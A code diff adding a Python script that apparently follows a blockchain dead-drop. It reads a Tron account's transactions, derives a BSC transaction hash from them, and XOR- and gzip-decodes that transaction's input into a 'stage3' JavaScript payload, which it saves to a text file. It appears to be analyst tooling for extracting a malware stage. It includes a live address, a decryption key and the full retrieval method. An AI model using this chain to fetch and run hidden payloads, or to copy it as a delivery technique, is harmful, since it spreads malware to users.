@@ -1,0 +1,37 @@
+import sys, json, gzip, base64, urllib.request
+sys.stdout.reconfigure(encoding="utf-8", errors="backslashreplace")
+ADDR = 'THKrGQ3EuFscDfCmcWFwWPtFbi5YWNQKNZ'
+KEY = '02e4f3e7-9442-4f9c-a6f4-4fa136605d1c'
+UA = {'User-Agent': 'Mozilla/5.0'}
+
+u = f'https://api.trongrid.io/v1/accounts/{ADDR}/transactions?only_confirmed=true&only_from=true&limit=5'
+r = json.load(urllib.request.urlopen(urllib.request.Request(u, headers=UA), timeout=30))
+for t in r.get('data', []):
+    print('tron tx', t['txID'], t['block_timestamp'], t['raw_data'].get('data'))
+latest = r['data'][0]
+k = latest['raw_data']['data']
+h = len(k) >> 1
+k = k[h:] + k[:h]
+bsc_hash = '0x' + bytes.fromhex(k).decode('utf8')
+print('BSC hash', bsc_hash)
+
+body = json.dumps({'jsonrpc': '2.0', 'method': 'eth_getTransactionByHash', 'params': [bsc_hash], 'id': 1}).encode()
+res = None
+for host in ('bsc-dataseed.binance.org', 'bsc-rpc.publicnode.com'):
+    try:
+        req = urllib.request.Request(f'https://{host}/', data=body, headers={'Content-Type': 'application/json', **UA})
+        res = json.load(urllib.request.urlopen(req, timeout=30))
+        if res.get('result'):
+            print('from', host, 'tx from', res['result'].get('from'), 'to', res['result'].get('to'), 'block', res['result'].get('blockNumber'))
+            break
+    except Exception as e:
+        print(host, 'err', e)
+inp = res['result']['input'][2:]
+s = bytes.fromhex(inp).decode('utf8')
+s = s[::-1]
+x = ''.join(chr(ord(c) ^ ord(KEY[i % len(KEY)])) for i, c in enumerate(s))
+print('prefix', repr(x[:8]))
+assert x.startswith('BCGZ1|')
+code = gzip.decompress(base64.b64decode(x[6:])).decode('utf8')
+open('stage3.js.txt', 'w', encoding='utf-8').write(code)
+print('stage3 len', len(code))
